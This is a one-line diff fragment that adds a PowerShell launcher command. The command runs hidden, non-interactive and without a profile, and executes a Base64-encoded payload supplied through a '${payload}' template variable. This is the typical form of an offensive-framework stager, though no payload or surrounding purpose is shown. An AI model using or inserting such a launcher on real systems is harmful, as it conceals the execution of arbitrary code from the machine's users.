@@ -1,0 +1,1 @@
+powershell.exe -NoP -sta -NonI -W Hidden -Enc ${payload}
